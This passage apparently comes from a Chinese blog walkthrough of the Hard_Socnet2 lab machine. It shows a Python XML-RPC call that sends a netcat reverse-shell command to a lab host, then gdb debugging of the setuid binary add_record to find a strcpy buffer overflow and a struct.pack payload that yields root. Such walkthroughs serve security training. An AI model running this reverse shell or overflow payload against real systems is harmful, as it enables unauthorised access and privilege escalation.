+<h3 id="反弹shell得到socnet权限"><a href="#反弹shell得到socnet权限" class="headerlink" title="反弹shell得到socnet权限"></a>反弹shell得到socnet权限</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://192.168.50.43:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    cmd = <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.50.216 6666 &gt;/tmp/f&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(proxy.secure_cmd(cmd,<span class="number">9935</span>)))</span><br></pre></td></tr></table></figure>
+
+<h2 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h2><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222200951904.png" alt="image-20240222200951904"></p>
+<p>add_record是个32位Linux可执行程序且具有特殊权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">peda  python  动态调试</span><br></pre></td></tr></table></figure>
+
+<p>首先执行 查看是否含有提交数据入口点</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222202050996.png" alt="image-20240222202050996"></p>
+<p>发现含有几个位置用户可以提交数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record   # 静态调试程序</span><br><span class="line">gdb -q  #程序静态执行</span><br><span class="line">r 		#执行</span><br><span class="line">q		#退出</span><br></pre></td></tr></table></figure>
+
+<p>查找存在内存溢出的变量位置（输入大量数据）</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222202702534.png" alt="image-20240222202702534"></p>
+<p>程序正常退出，说明不存在</p>
+<p>在最后一个变量 描述中存在溢出</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222203152047.png" alt="image-20240222203152047"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">重点关注：EIP: 0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">确定(&#x27;AAAA&#x27;)属于哪个位置</span><br><span class="line">一开始判断 选择使用500个去写入  判断出溢出点后 </span><br><span class="line">可以先减少字符后 再进行寻找溢出位置 后面减少到100 仍可以 判断出溢出</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 pattern 生成特殊字符</span><br><span class="line">pattern create 100</span><br><span class="line">pattern search   #识别位置</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204057490.png" alt="image-20240222204057490"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204159710.png" alt="image-20240222204159710"></p>
+<p>使用 <code>pattern search</code> 即可帮助我们识别出来</p>
+<p>验证</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204424234.png" alt="image-20240222204424234"></p>
+<p>填入数据验证得</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204455545.png" alt="image-20240222204455545"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前62位占位  BCDE 成功溢出</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disas main   #显示程序 汇编代码</span><br><span class="line">程序执行 CPU分配下发地址</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204832573.png" alt="image-20240222204832573"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call 调用系统函数 打开文本文件命令</span><br><span class="line">通过之前找用户提交数据位置点的时候 程序会生成一个txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222211542280.png" alt="image-20240222211542280"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">break *地址				   #下断点</span><br><span class="line">s							#单步执行</span><br><span class="line">c							#继续执行</span><br><span class="line">del number					#删断点</span><br><span class="line">info func     				#查看函数信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222211442585.png" alt="image-20240222211442585"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disas 方法名					#查看具体函数所执行的汇编指令</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222211945780.png" alt="image-20240222211945780"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;strcpy@plt&gt; 存在缓冲区溢出漏洞</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222212132389.png" alt="image-20240222212132389"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;setuid@plt&gt;</span><br><span class="line">&lt;system@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">程序执行：</span><br><span class="line">打开文本文件</span><br><span class="line">用户提交用户名</span><br><span class="line">用户提交工作年限</span><br><span class="line">用户提交薪资</span><br><span class="line">用户提交是否遇到麻烦 遇到过为1 没有为0</span><br><span class="line">用户描述遇到的问题</span><br><span class="line">（工作年限和工资都为int类型）（溢出存在于用户描述问题这个变量0）</span><br><span class="line">一定要选遇到过 输入1   输入0则直接退出程序</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222212627878.png" alt="image-20240222212627878"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据是倒过来存储</span><br><span class="line">CPU架构  大头小头概念</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import struct;print(&#x27;aa\n1\n1\n1\n&#x27; +&#x27;A&#x27;* 62 + struct.pack(&#x27;I&#x27;,0x08048676))&quot; &gt; payload</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222214209987.png" alt="image-20240222214209987"></p>
+<p>将 payload 输入进程序 查看</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222215257158.png" alt="image-20240222215257158"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发现 程序 新建了两个进程 /bin/bash</span><br><span class="line">跟进一下 查看程序发生了什么</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222220409213.png" alt="image-20240222220409213"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br><span class="line">查看payload 将payload 全部输入给 add_record 这个程序即可提权</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222220950638-1708611399263-40.png" alt="image-20240222220950638"></p>
+<hr>
+<h3 id="gdb命令总结"><a href="#gdb命令总结" class="headerlink" title="gdb命令总结"></a>gdb命令总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./程序名  #静态调试程序</span><br><span class="line">gdb -q  		#程序静态执行</span><br><span class="line">r 				#执行</span><br><span class="line">q				#退出</span><br><span class="line"></span><br><span class="line">pattern create 100		#生成100位特殊字符</span><br><span class="line">pattern search			#定位字符</span><br><span class="line"></span><br><span class="line">break *地址			   #下断点</span><br><span class="line">s						#单步执行</span><br><span class="line">c						#继续执行</span><br><span class="line">del number				#删断点</span><br><span class="line">info func     			#查看函数信息</span><br><span class="line">disas main  			#显示程序全部汇编代码</span><br><span class="line">disas 方法名			  #查看具体函数所执行的汇编指令</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/links/">Links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E9%92%88"><span class="toc-number">2.</span> <span class="toc-text">端口探针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E9%92%88"><span class="toc-number">3.</span> <span class="toc-text">服务探针</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.1.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">SQL注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E4%B8%80%EF%BC%9A%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">提权一：内核提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-3493"><span class="toc-number">5.1.</span> <span class="toc-text">CVE-2021-3493</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E4%BA%8C%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权二：缓冲区溢出提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLRPC%E6%A8%A1%E5%9D%97"><span class="toc-number">6.1.</span> <span class="toc-text">XMLRPC模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%BE%97%E5%88%B0socnet%E6%9D%83%E9%99%90"><span class="toc-number">6.2.</span> <span class="toc-text">反弹shell得到socnet权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">7.</span> <span class="toc-text">调试程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93"><span class="toc-number">7.1.</span> <span class="toc-text">gdb命令总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&text=Hard_Socnet2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&title=Hard_Socnet2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&is_video=false&description=Hard_Socnet2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Hard_Socnet2&body=Check out this article: https://liangmosec.github.io/2024/02/22/Hard-Socnet2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&title=Hard_Socnet2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&title=Hard_Socnet2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&title=Hard_Socnet2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&title=Hard_Socnet2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&name=Hard_Socnet2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2024/02/22/Hard-Socnet2/&t=Hard_Socnet2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    凉墨
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
